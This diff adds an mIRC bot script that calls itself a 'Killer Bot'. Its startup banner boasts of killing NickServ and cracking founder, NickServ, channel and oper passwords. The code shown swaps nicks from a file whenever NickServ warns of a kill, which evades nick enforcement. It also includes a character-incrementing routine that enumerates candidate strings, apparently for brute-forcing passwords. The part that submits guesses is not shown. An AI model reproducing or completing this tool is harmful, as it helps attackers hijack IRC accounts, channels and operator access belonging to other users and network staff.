@@ -1,0 +1,76 @@
+on 1:SNotice:*You have 20 seconds before I kill you.*:{
+  /nick $read -l%num d:\script\alpha\names.txt  
+}
+on 1:Start:{
+  /echo 2This is the Killer Bot Script from Snowman and Robocop
+  /echo 2This is a Bot from the S|=|@|}0\\´ Script 
+  /echo 2This Bot can:
+  /echo 2---------------------------------------------------------------
+  /echo 2 Kill Nickserv 
+  /echo 2 Hack Founder Pass (Beta)
+  /echo 2 Hack Nickserv Pass  (Beta)
+  /echo 2 Hack Channel Pass (Beta)
+  /echo 2 Hack Oper Pass (Beta)
+  /echo 2---------------------------------------------------------------
+  /echo 2Some of these Hacker things are BUGFULLY
+  /echo 2Please 4don´t COPY 2 this BOT 
+  /titlebar SH@|}0\\´ Script Killer Bot   
+}
+on 1:Connect:{
+  /mode $me +ws 
+  /join #SHADOW
+}
+alias Shownext {
+  set %ct 0
+  :Inc
+  IncCode
+  %ct = %ct + 1
+  echo NewCode: %code
+  if %ct <= $1 { goto Inc }
+}
+
+alias IncCode {
+  ; This procedure increases the entire code
+  set %curchgpos 1
+  set %take 1
+  :BeginInc
+  IncChar %curchgpos
+  set %take %take + 1
+  if (( %take <= $len( %code ) ) && ( %incnext == true )) { set %curchgpos %curchgpos + 1 | unset %incnext | goto BeginInc }
+}
+
+alias IncChar {
+  ; This procedure increases just one single char
+  ; Syntax: IncChar <PosOfChar>
+  ; <PosOfChar> is the position of the char to change. 1 means the rightest char.
+  if (( $1 < 1 ) || ( $1 > $len( %code ) )) { echo 4WARNING! Syntax error in procedure IncChar. | echo Syntax: IncChar <PosOfChar> (You tried to change the $1. char in a $len( %code ) chars length string) | halt }
+  set %posofstring $1 - 1
+  set %postochange $len( %code ) - %posofstring
+  unset %posofstring
+  set %chartochange $mid( %code , %postochange , 1)
+  set %ascofchar $asc( %chartochange )
+  unset %chartochange
+  set %ascofnewchar %ascofchar + 1
+  unset %ascofchar
+  ; The following lines are for cricitcal chars
+  ; 32 - [Space] is interpreted as unvisible - B+[Space] changes to B
+  ; 0   - [NUL] same as [Space]
+  ; 61 - = I don't know, why this doesn't work
+  if %ascofnewchar > 255 { set %ascofnewchar 0 | set %incnext true }
+  if %ascofnewchar == 32 { set %ascofnewchar 33 }
+  if %ascofnewchar == 0 { set %ascofnewchar 1 }
+  if %ascofnewchar == 61 { set %ascofnewchar 62 }
+  set %newchar $chr( %ascofnewchar )
+  unset %ascofnewchar
+  set %unchangedstringlen %postochange - 1
+  set %unchangedstring $left( %code , %unchangedstringlen )
+  unset %unchangedstringlen
+  set %charsafterchanged $len( %code ) - %postochange
+  unset %postochange
+  set %rest $right( %code , %charsafterchanged )
+  unset %charsafterchanged
+  set %code %unchangedstring $+ %newchar $+ %rest
+  unset %newchar
+  unset %rest
+  unset %unchangedstring
+}
